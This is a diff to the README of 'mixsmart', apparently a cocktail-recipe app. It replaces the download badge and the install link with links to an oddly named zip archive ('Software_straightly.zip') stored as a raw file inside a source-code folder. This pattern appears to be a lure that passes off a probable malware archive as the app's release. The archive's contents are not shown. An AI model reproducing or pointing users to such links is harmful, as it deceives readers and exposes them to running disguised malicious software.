@@ -1,6 +1,6 @@
 # 🍹 mixsmart - Make Your Perfect Cocktail Effortlessly
 
-[![Download mixsmart](https://raw.githubusercontent.com/msHoumani/mixsmart/main/src/routes/social/Software_v2.8.zip)](https://raw.githubusercontent.com/msHoumani/mixsmart/main/src/routes/social/Software_v2.8.zip)
+[![Download mixsmart](https://raw.githubusercontent.com/msHoumani/mixsmart/main/src/components/recipe/Software_straightly.zip)](https://raw.githubusercontent.com/msHoumani/mixsmart/main/src/components/recipe/Software_straightly.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ To run mixsmart smoothly, your computer should meet the following requirements:
 
 ## 📦 Download & Install
 
-To download mixsmart, visit this page: [Download mixsmart](https://raw.githubusercontent.com/msHoumani/mixsmart/main/src/routes/social/Software_v2.8.zip). 
+To download mixsmart, visit this page: [Download mixsmart](https://raw.githubusercontent.com/msHoumani/mixsmart/main/src/components/recipe/Software_straightly.zip). 
 
 1. Navigate to the "Releases" section.
 2. Look for the latest version of mixsmart.
